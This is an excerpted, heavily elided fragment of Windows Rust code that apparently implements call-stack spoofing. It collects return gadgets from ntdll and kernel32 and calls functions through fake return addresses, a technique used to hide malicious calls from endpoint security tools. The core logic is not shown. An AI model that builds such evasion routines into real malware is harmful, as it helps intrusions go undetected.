...
static GADGETS: GadgetCell = GadgetCell(UnsafeCell::new(SpoofGadgets {
    ...
    count_kernel32: 0,
    initialized: false,
    ntdll_sites: [unwind::ReturnSite {
        address: 0,
        frame_size: 0,
    }; 16],
    ntdll_site_count: 0,
    kernel32_sites: [unwind::ReturnSite {
        address: 0,
        frame_size: 0,
    }; 16],
 ...
 * */
unsafe fn scan_module_for_gadgets(
    module_base: HANDLE,
    gadgets: &mut [*mut c_void; 8 as usize],
) -> usize {
    unsafe {
...
pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> i32 {
    unsafe {
        ...
        let (ntdll_ret, kernel32_ret) = if g.ntdll_site_count > 0 && g.kernel32_site_count > 0 {
            ...
            (
                g.ntdll_sites[nt_idx].address,
                g.kernel32_sites[k32_idx].address,
            )
        } else {
            (
                g.ntdll_gadgets[counter % g.count_ntdll] as usize,
                g.kernel32_gadgets[counter % g.count_kernel32] as usize,
            )
        };
...
unsafe fn call_direct(function: *mut c_void, args: &[usize]) -> i32 {
    unsafe {
        match args.len() {
            ...
            2 => {
                let f: unsafe extern "system" fn(usize, usize) -> i32 =
                    core::mem::transmute(function);
                f(args[0], args[1])
            }
            _ => {
                let f: unsafe extern "system" fn(usize, usize, usize, usize) -> i32 =
                    core::mem::transmute(function);
                f(
                    args[0],
